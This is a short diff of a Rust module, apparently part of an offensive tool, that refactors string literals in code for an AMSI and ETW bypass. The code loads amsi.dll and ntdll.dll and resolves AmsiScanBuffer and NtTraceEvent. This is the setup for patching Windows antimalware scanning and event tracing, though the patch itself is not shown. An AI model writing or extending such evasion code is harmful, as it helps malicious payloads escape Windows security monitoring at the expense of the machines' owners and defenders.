@@ -171,14 +171,14 @@ mod imp {
         // `amsi.dll` may not be loaded yet; LoadLibraryA loads it if needed.
         // SAFETY: the string literal is null-terminated ASCII; LoadLibraryA
         // copies it internally.
-        let amsi_mod = unsafe { LoadLibraryA(b"amsi.dll\0".as_ptr()) };
+        let amsi_mod = unsafe { LoadLibraryA(c"amsi.dll".as_ptr().cast()) };
         if amsi_mod.is_null() {
             return Err(BypassError::GetModule("amsi.dll"));
         }
 
         // SAFETY: amsi_mod is a valid module handle; "AmsiScanBuffer\0" is
         // null-terminated ASCII.
-        let amsi_scan = unsafe { GetProcAddress(amsi_mod, b"AmsiScanBuffer\0".as_ptr()) };
+        let amsi_scan = unsafe { GetProcAddress(amsi_mod, c"AmsiScanBuffer".as_ptr().cast()) };
         match amsi_scan {
             Some(proc) => {
                 let addr = proc as usize;
@@ -191,14 +191,14 @@ mod imp {
         // ── ETW bypass ────────────────────────────────────────────────────
         // `ntdll.dll` is always mapped into every process.
         // SAFETY: "ntdll.dll\0" is null-terminated ASCII.
-        let ntdll = unsafe { GetModuleHandleA(b"ntdll.dll\0".as_ptr()) };
+        let ntdll = unsafe { GetModuleHandleA(c"ntdll.dll".as_ptr().cast()) };
         if ntdll.is_null() {
             return Err(BypassError::GetModule("ntdll.dll"));
         }
 
         // SAFETY: ntdll is a valid module handle; "NtTraceEvent\0" is
         // null-terminated ASCII.
-        let nt_trace = unsafe { GetProcAddress(ntdll, b"NtTraceEvent\0".as_ptr()) };
+        let nt_trace = unsafe { GetProcAddress(ntdll, c"NtTraceEvent".as_ptr().cast()) };
         match nt_trace {
             Some(proc) => {
                 let addr = proc as usize;
